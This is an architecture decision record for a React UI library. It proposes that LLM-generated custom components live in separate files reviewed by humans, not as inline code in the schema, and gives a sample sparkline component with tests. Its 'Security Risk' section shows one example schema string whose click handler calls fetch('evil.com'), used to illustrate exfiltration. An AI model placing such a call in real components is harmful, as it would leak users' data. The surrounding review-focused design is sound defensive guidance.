# LLM + React Code Architecture Decision

> **Decision:** YES, LLM can generate React code - but as FILES, not inline in schema.
> **Status:** PROPOSAL
> **Related:** WF-0004 Architecture Hardening

---

## The Question

Should LLM be able to insert raw React code when needed to generate full React components?

---

## Decision Matrix

| Approach | Flexibility | Security | Serializable | Portable | Testable |
|----------|-------------|----------|--------------|----------|----------|
| Inline React in Schema | High | DANGEROUS | No | No | Hard |
| **LLM generates files** | **High** | **Reviewable** | **Yes** | **Yes** | **Yes** |
| Config-only slots | Medium | Safe | Yes | Yes | Yes |
| Sandboxed eval | Medium | Complex | No | No | Medium |

---

## Recommended Architecture: File-Based Generation

```
┌─────────────────────────────────────────────────────────────────┐
│  TIER 1: LiquidCode DSL (90% of cases)                          │
│  ─────────────────────────────────────────────────────────────  │
│  Kp :revenue, Bt "Submit", Cn ^row [...]                        │
│  Fast, safe, fully controlled                                    │
└─────────────────────────────────────────────────────────────────┘
                              ↓ When DSL isn't enough
┌─────────────────────────────────────────────────────────────────┐
│  TIER 2: LLM-Generated Custom Components (10% of cases)         │
│  ─────────────────────────────────────────────────────────────  │
│  LLM generates files → Human reviews → Register → Use in DSL    │
│  Custom "sparkline" :data #green                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## Why NOT Inline React Code

### 1. Security Risk
```typescript
// ❌ DANGEROUS - eval() of LLM code
{
  "type": "custom",
  "reactCode": "const [x, setX] = useState(0); return <div onClick={() => fetch('evil.com')}>"
}
```
- XSS vulnerabilities
- Data exfiltration
- Arbitrary code execution
- No review before execution

### 2. Platform Lock-in
```typescript
// ❌ React-specific, can't port to Vue/Swift/Kotlin
{
  "type": "custom",
  "reactCode": "const [state, setState] = useState()..."
}
```

### 3. Not Serializable
- Can't cache schemas
- Can't transfer over network safely
- Can't store in database

### 4. Not Testable
- No file to unit test
- No isolation
- Hard to debug

---

## Correct Architecture: Schema References, Files Implement

### Schema (Platform-Agnostic)

```json
{
  "type": "custom",
  "componentId": "revenue-sparkline",
  "binding": { "kind": "field", "value": "monthlyRevenue" },
  "style": { "color": "green" },
  "props": {
    "height": 40,
    "showLabels": true
  }
}
```

### DSL Syntax

```
Custom "revenue-sparkline" :monthlyRevenue #green { height: 40 }
```

### Component Implementation (Generated by LLM)

```typescript
// src/custom/revenue-sparkline/react.tsx
import { LiquidComponentProps, resolveBinding } from '@liquid-render/react';
import { Sparkline } from 'some-chart-lib';

export function RevenueSparkline({ block, data }: LiquidComponentProps) {
  const values = resolveBinding(block.binding, data);
  const color = block.style?.color || 'blue';
  const height = block.props?.height || 32;

  return (
    <Sparkline
      data={values}
      color={color}
      height={height}
    />
  );
}
```

### Registration (Runtime)

```tsx
<LiquidUI
  schema={schema}
  data={data}
  customComponents={{
    'revenue-sparkline': RevenueSparkline,
    'map-view': MapView,
    'video-player': VideoPlayer,
  }}
/>
```

---

## LLM Workflow

```
┌─────────────────────────────────────────────────────────────────┐
│  1. User Request                                                 │
│     "I need a sparkline component for revenue trends"           │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│  2. LLM Generates Files                                          │
│                                                                  │
│  src/custom/revenue-sparkline/                                   │
│  ├── contract.ts       ← Props interface (platform-agnostic)    │
│  ├── react.tsx         ← React implementation                   │
│  ├── react.test.tsx    ← Tests                                  │
│  ├── vue.vue           ← Vue implementation (optional/future)   │
│  └── README.md         ← Usage docs                             │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│  3. Human Reviews                                                │
│                                                                  │
│  • Security check (no eval, no fetch to unknown URLs)           │
│  • Code quality                                                  │
│  • Tests pass                                                    │
│  • Approve or request changes                                    │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│  4. Register in App                                              │
│                                                                  │
│  customComponents['revenue-sparkline'] = RevenueSparkline       │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│  5. Use in DSL                                                   │
│                                                                  │
│  Custom "revenue-sparkline" :data #green                        │
└─────────────────────────────────────────────────────────────────┘
```

---

## Component Contract

```typescript
// src/types/custom-component.ts

/**
 * Contract for custom components - shared across all platforms
 */
export interface CustomComponentContract {
  /** Unique identifier */
  id: string;

  /** Human-readable name */
  name: string;

  /** Serializable props schema */
  props: {
    [key: string]: {
      type: 'string' | 'number' | 'boolean' | 'array' | 'object';
      required?: boolean;
      default?: unknown;
      description?: string;
    };
  };

  /** Supported bindings */
  bindings?: {
    primary?: 'array' | 'object' | 'string' | 'number';
    secondary?: 'array' | 'object' | 'string' | 'number';
  };
}

/**
 * Props passed to custom component implementations
 */
export interface CustomComponentProps {
  block: CustomBlock;
  data: DataContext;
  children?: React.ReactNode;
}

/**
 * Custom block in schema
 */
export interface CustomBlock {
  type: 'custom';
  componentId: string;
  binding?: Binding;
  style?: Style;
  props?: Record<string, unknown>;
  children?: Block[];
}
```

---

## Platform Portability

Same schema, different renderers:

| Platform | Registration | Notes |
|----------|--------------|-------|
| React | `customComponents={{ 'sparkline': ReactSparkline }}` | Current |
| Vue | `:custom-components="{ 'sparkline': VueSparkline }"` | Future |
| Swift | `customComponents["sparkline"] = SparklineView.self` | Future |
| Kotlin | `customComponents["sparkline"] = SparklineComposable::class` | Future |
| Web Components | `customElements.define('liquid-sparkline', Sparkline)` | Future |

---

## Security Boundaries

### What LLM CAN Generate

- Standalone component files
- Tests for components
- Props interfaces
- Documentation

### What LLM CANNOT Do

- Inject code into schema
- Execute code without review
- Modify core library files
- Access external systems without props

### Review Checklist

```markdown
## Component Review Checklist

- [ ] No `eval()` or `new Function()`
- [ ] No dynamic imports from external URLs
- [ ] No `fetch()` to hardcoded external domains
- [ ] No localStorage/sessionStorage access without props
- [ ] Uses `resolveBinding()` for data access
- [ ] Props are serializable (no functions)
- [ ] Tests cover main use cases
- [ ] TypeScript types are correct
```

---

## Example: Full Custom Component

### 1. Contract (contract.ts)

```typescript
import { CustomComponentContract } from '@liquid-render/types';

export const sparklineContract: CustomComponentContract = {
  id: 'revenue-sparkline',
  name: 'Revenue Sparkline',
  props: {
    height: { type: 'number', default: 32, description: 'Chart height in px' },
    showLabels: { type: 'boolean', default: false },
    color: { type: 'string', default: 'blue' },
  },
  bindings: {
    primary: 'array',  // Expects array of numbers
  },
};
```

### 2. React Implementation (react.tsx)

```typescript
import React from 'react';
import { CustomComponentProps, resolveBinding } from '@liquid-render/react';

export function RevenueSparkline({ block, data }: CustomComponentProps) {
  // Resolve data binding
  const values = resolveBinding(block.binding, data) as number[];

  // Get props with defaults
  const height = (block.props?.height as number) || 32;
  const showLabels = (block.props?.showLabels as boolean) || false;
  const color = block.style?.color || 'blue';

  // Handle empty data
  if (!Array.isArray(values) || values.length === 0) {
    return <div style={{ height, color: '#999' }}>No data</div>;
  }

  // Calculate sparkline
  const max = Math.max(...values);
  const min = Math.min(...values);
  const range = max - min || 1;

  const points = values.map((v, i) => {
    const x = (i / (values.length - 1)) * 100;
    const y = 100 - ((v - min) / range) * 100;
    return `${x},${y}`;
  }).join(' ');

  return (
    <svg
      data-liquid-type="custom"
      data-component-id="revenue-sparkline"
      viewBox="0 0 100 100"
      style={{ width: '100%', height }}
      preserveAspectRatio="none"
    >
      <polyline
        fill="none"
        stroke={color}
        strokeWidth="2"
        points={points}
      />
    </svg>
  );
}
```

### 3. Tests (react.test.tsx)

```typescript
import { render, screen } from '@testing-library/react';
import { RevenueSparkline } from './react';

describe('RevenueSparkline', () => {
  it('renders sparkline with data', () => {
    const block = {
      type: 'custom' as const,
      componentId: 'revenue-sparkline',
      binding: { kind: 'field' as const, value: 'data' },
    };
    const data = { data: [10, 20, 15, 30, 25] };

    render(<RevenueSparkline block={block} data={data} />);

    expect(screen.getByRole('img', { hidden: true })).toBeInTheDocument();
  });

  it('handles empty data', () => {
    const block = {
      type: 'custom' as const,
      componentId: 'revenue-sparkline',
      binding: { kind: 'field' as const, value: 'data' },
    };
    const data = { data: [] };

    render(<RevenueSparkline block={block} data={data} />);

    expect(screen.getByText('No data')).toBeInTheDocument();
  });
});
```

### 4. Usage in DSL

```
Custom "revenue-sparkline" :monthlyRevenue #green { height: 48 }
```

### 5. Registration

```tsx
import { RevenueSparkline } from './custom/revenue-sparkline/react';

<LiquidUI
  schema={schema}
  data={data}
  customComponents={{
    'revenue-sparkline': RevenueSparkline,
  }}
/>
```

---

## Implementation Checklist

### Phase 1: Core Infrastructure

- [ ] Add `Custom` to parser (`ui-parser.ts`)
- [ ] Add `CustomBlock` type to emitter (`ui-emitter.ts`)
- [ ] Add `customComponents` prop to `LiquidUI.tsx`
- [ ] Add `CustomComponentProps` types export
- [ ] Update `BlockRenderer` to handle custom type

### Phase 2: Developer Experience

- [ ] Create `src/custom/` directory structure
- [ ] Add CLI/script to scaffold custom components
- [ ] Document component contract
- [ ] Add examples

### Phase 3: LLM Integration

- [ ] Create prompt template for component generation
- [ ] Define output format for generated components
- [ ] Create review workflow

---

## Summary

| Aspect | Decision |
|--------|----------|
| Can LLM generate React code? | YES |
| Where does code live? | Separate files (not in schema) |
| When is code executed? | After human review |
| Is schema portable? | YES (componentId reference only) |
| Is it secure? | YES (review required) |
| Is it testable? | YES (standalone files) |

---

*Document created: 2024-12-25*
*Author: Claude Code*
